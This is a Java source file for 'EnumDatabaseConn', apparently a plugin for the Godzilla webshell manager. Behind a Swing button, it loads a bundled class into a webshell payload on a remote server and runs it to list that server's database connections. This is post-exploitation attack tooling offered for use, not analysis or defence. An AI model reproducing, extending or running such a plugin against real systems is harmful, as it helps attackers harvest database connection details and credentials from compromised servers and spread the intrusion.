package net.BeichenDream.Godzilla.shells.plugins.java;

import net.BeichenDream.Godzilla.core.Encoding;
import net.BeichenDream.Godzilla.core.annotation.PluginAnnotation;
import net.BeichenDream.Godzilla.core.imp.Payload;
import net.BeichenDream.Godzilla.core.imp.Plugin;
import net.BeichenDream.Godzilla.core.shell.ShellEntity;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextArea;
import net.BeichenDream.Godzilla.util.Log;
import net.BeichenDream.Godzilla.util.automaticBindClick;
import net.BeichenDream.Godzilla.util.functions;
import net.BeichenDream.Godzilla.util.http.ReqParameter;

@PluginAnnotation(Name = "EnumDatabaseConn", payloadName = "JavaDynamicPayload")
public class EnumDatabaseConn implements Plugin {
    private static final String CLASS_NAME = "plugin.ShellDriver";
    private Encoding encoding;
    private JButton enumDatabaseConnButton = new JButton("EnumDatabaseConn");
    private boolean loadState;
    private JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private JTextArea resultTextArea = new JTextArea();
    private ShellEntity shell;
    private JSplitPane splitPane = new JSplitPane();

    public EnumDatabaseConn() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.enumDatabaseConnButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.panel.add(this.splitPane);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override // core.imp.Plugin
    public JPanel getView() {
        return this.panel;
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("assets/ShellDriver.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                    return;
                }
                Log.log("Load fail", new Object[0]);
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private void enumDatabaseConnButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            load();
        }
        if (this.loadState) {
            this.resultTextArea.setText(this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "run", new ReqParameter())));
            return;
        }
        Log.error("load EnumDatabaseConn Fail!");
    }

    @Override // core.imp.Plugin
    public void init(ShellEntity arg0) {
        this.shell = arg0;
        this.payload = arg0.getPayloadModel();
        this.encoding = Encoding.getEncoding(arg0);
    }
}
